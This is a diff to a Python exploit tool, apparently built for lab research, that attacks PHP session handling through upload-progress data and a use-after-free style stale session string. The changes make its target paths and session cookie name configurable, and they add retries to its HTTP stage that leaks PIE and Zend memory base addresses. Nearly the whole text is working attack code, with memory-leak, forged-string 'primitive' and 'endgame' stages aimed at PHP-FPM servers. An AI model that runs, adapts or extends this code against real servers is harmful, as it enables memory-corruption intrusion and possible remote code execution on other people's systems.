@@ -67,6 +67,27 @@ MEM_CHUNK = 0x200000
 OOM_SID = b"fmroom000000000001"
 REF_SID = b"fpmref000000000001"
 
+PATHS = {
+    "app": "/app.php",
+    "arm": "/bigvar.php",
+    "ref": "/ref.php",
+    "probe": "/nope.php",
+    "cookie": "PHPSESSID",
+}
+
+
+def _cookie(sid: bytes) -> bytes:
+    return PATHS["cookie"].encode("latin1") + b"=" + sid
+
+
+def configure_paths(args) -> None:
+    for key, attr in (("app", "app_path"), ("arm", "arm_path"),
+                      ("ref", "ref_path"), ("probe", "probe_path"),
+                      ("cookie", "session_cookie")):
+        value = getattr(args, attr, None)
+        if value:
+            PATHS[key] = str(value)
+
 
 # --------------------------------------------------------------------------- #
 # http
@@ -289,7 +310,7 @@ def session_file(version: str, sid: bytes) -> str:
 def big_session_post(builder: Target, sid: bytes, size: int) -> tuple[int, bytes]:
     """Progress-key 4MB string -> session file with a huge key (cleanup=Off)."""
     parts = [
-        {"name": "PHPSESSID", "data": sid},
+        {"name": PATHS["cookie"], "data": sid},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"A" * size},
         {"name": "f", "filename": "a.txt", "data": b"x" * 16},
     ]
@@ -300,12 +321,12 @@ def big_session_post(builder: Target, sid: bytes, size: int) -> tuple[int, bytes
 def ref_session_post(builder: Target, sid: bytes) -> tuple[int, bytes]:
     """ref.php stores $_SESSION['r'] =& $_SESSION['a'] -> 'R:2' in the file."""
     status, _headers, body = builder.post_urlencoded(
-        {"x": "1"}, cookie=b"PHPSESSID=" + sid, path="/ref.php")
+        {"x": "1"}, cookie=_cookie(sid), path=PATHS["ref"])
     return status, body
 
 
 def producer_get(chain: Target, sid: bytes) -> tuple[int, bytes]:
-    status, _headers, body = chain.get("/app.php", cookie=b"PHPSESSID=" + sid)
+    status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
     return status, body
 
 
@@ -402,7 +423,7 @@ def _consume_b(chainapp: Target, forged: bytes,
     parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
     parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
     status, headers, body = chainapp.post_multipart(parts, b"CONSUME01",
-                                                    cookie=b"PHPSESSID=" + REF_SID)
+                                                    cookie=_cookie(REF_SID))
     print(f"[*] consumer status={status}")
     return status, headers, body
 
@@ -475,7 +496,7 @@ def cmd_producer(args) -> int:
     chain = Target(args.base)
     sid = args.sid.encode("latin1")
     before = find_pool_worker(args.version, "chain")
-    status, _headers, body = chain.get("/app.php", cookie=b"PHPSESSID=" + sid)
+    status, _headers, body = chain.get(PATHS["app"], cookie=_cookie(sid))
     time.sleep(0.2)
     after = find_pool_worker(args.version, "chain")
     print(f"producer status={status} worker {before} -> {after} "
@@ -579,8 +600,8 @@ def cmd_primitive(args) -> int:
     if the re-armed consume d differs from the probed d, retry (the pair
     stabilizes after at most one mismatch)."""
     base = Target(args.base)
-    chain404 = Target(args.base + "/nope.php")
-    chainapp = Target(args.base + "/app.php")
+    chain404 = Target(args.base + PATHS["probe"])
+    chainapp = Target(args.base + PATHS["app"])
     builder = Target(args.builder)
     oracle = Oracle(args.version)
     pads = _reclaim_pads(args.version)
@@ -727,8 +748,8 @@ def cmd_endgame(args) -> int:
         return 1
     proof = (args.proof_file or "out/p1").lstrip("/")
     base = Target(args.base)
-    chain404 = Target(args.base + "/nope.php")
-    chainapp = Target(args.base + "/app.php")
+    chain404 = Target(args.base + PATHS["probe"])
+    chainapp = Target(args.base + PATHS["app"])
     builder = Target(args.builder)
     oracle = Oracle(args.version)
     pads = _reclaim_pads(args.version)
@@ -870,8 +891,8 @@ def _dechunk(body: bytes) -> bytes:
     return bytes(out)
 
 
-def leak_bases_http(base_url: str, builder_url: str,
-                    version: str) -> tuple[int, int]:
+def leak_bases_http(base_url: str, builder_url: str, version: str,
+                    arm_path: str | None = None) -> tuple[int, int]:
     """Leak PIE and Zend-MM chunk bases over HTTP only.
 
     The stale short-session string is pointed at a forged zend_string
@@ -883,8 +904,9 @@ def leak_bases_http(base_url: str, builder_url: str,
     if geom is None:
         raise RuntimeError(f"no HTTP leak geometry for PHP {version}")
     chain = Target(base_url)
-    app = Target(base_url + "/app.php")
+    app = Target(base_url + PATHS["app"])
     builder = Target(builder_url)
+    arm_path = arm_path or geom["arm_path"]
     size = geom["size"]
     read_len = geom["read_len"]
     header = geom["header_content_off"]
@@ -901,12 +923,14 @@ def leak_bases_http(base_url: str, builder_url: str,
     parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
     parts.append({"name": "f", "filename": "a.txt", "data": b"x" * 8})
     for attempt in range(10):
+        if attempt:
+            time.sleep(0.25)
         try:
-            builder.get(geom["arm_path"], cookie=b"PHPSESSID=" + OOM_SID)
-            chain.get("/app.php", cookie=b"PHPSESSID=" + OOM_SID)
+            builder.get(arm_path, cookie=_cookie(OOM_SID))
+            chain.get(PATHS["app"], cookie=_cookie(OOM_SID))
             ref_session_post(builder, REF_SID)
             _status, _headers, body = app.post_multipart(
-                parts, b"HTTPLEAK", cookie=b"PHPSESSID=" + REF_SID,
+                parts, b"HTTPLEAK", cookie=_cookie(REF_SID),
                 timeout=180.0)
             raw = _dechunk(body)
             idx = raw.find(b"r\t")
@@ -970,7 +994,8 @@ def _local_bases(version: str) -> tuple[int, int]:
 def cmd_leak(args) -> int:
     """Leak the chunk and PIE bases over HTTP and print them."""
     try:
-        pie, chunk = leak_bases_http(args.base, args.builder, args.version)
+        pie, chunk = leak_bases_http(args.base, args.builder, args.version,
+                                     getattr(args, "arm_path", None))
     except (OSError, RuntimeError) as exc:
         print(f"[!] {exc}")
         return 1
@@ -994,7 +1019,8 @@ def cmd_no_oracle(args) -> int:
     chunk = getattr(args, "chunk", 0)
     if not chunk or not pie:
         try:
-            pie, chunk = leak_bases_http(args.base, args.builder, args.version)
+            pie, chunk = leak_bases_http(args.base, args.builder, args.version,
+                                         getattr(args, "arm_path", None))
             print("[*] bases from HTTP stale-string leak: "
                   f"pie=0x{pie:x} chunk=0x{chunk:x}")
         except (OSError, RuntimeError) as exc:
@@ -1023,8 +1049,8 @@ def cmd_no_oracle(args) -> int:
         return 1
     proof = (args.proof_file or "out/p1").lstrip("/")
     base = Target(args.base)
-    chain404 = Target(args.base + "/nope.php")
-    chainapp = Target(args.base + "/app.php")
+    chain404 = Target(args.base + PATHS["probe"])
+    chainapp = Target(args.base + PATHS["app"])
     builder = Target(args.builder)
     local_proof = os.path.join(LAB, "webroot", proof)
 
@@ -1131,6 +1157,16 @@ def main() -> int:
     parser.add_argument("--proof-file", default="out/p1")
     parser.add_argument("--chunk", type=lambda x: int(x, 0), default=0)
     parser.add_argument("--pie", type=lambda x: int(x, 0), default=0)
+    parser.add_argument("--app-path", default=None,
+                        help="session application operation path (default /app.php)")
+    parser.add_argument("--arm-path", default=None,
+                        help="stale-session arm path (default profile or /bigvar.php)")
+    parser.add_argument("--ref-path", default=None,
+                        help="reference-bearing session builder path (default /ref.php)")
+    parser.add_argument("--probe-path", default=None,
+                        help="404/no-op path used for reclaim probes (default /nope.php)")
+    parser.add_argument("--session-cookie", default=None,
+                        help="session cookie name (default PHPSESSID)")
     sub = parser.add_subparsers(dest="cmd", required=True)
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                  "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
@@ -1141,6 +1177,7 @@ def main() -> int:
                 "--allow-local-fallback", action="store_true",
                 help="allow /proc/<pid>/maps if the HTTP leak fails (lab only)")
     args = parser.parse_args()
+    configure_paths(args)
     dispatch = {
         "lifecycle": cmd_lifecycle,
         "oracle": cmd_oracle,
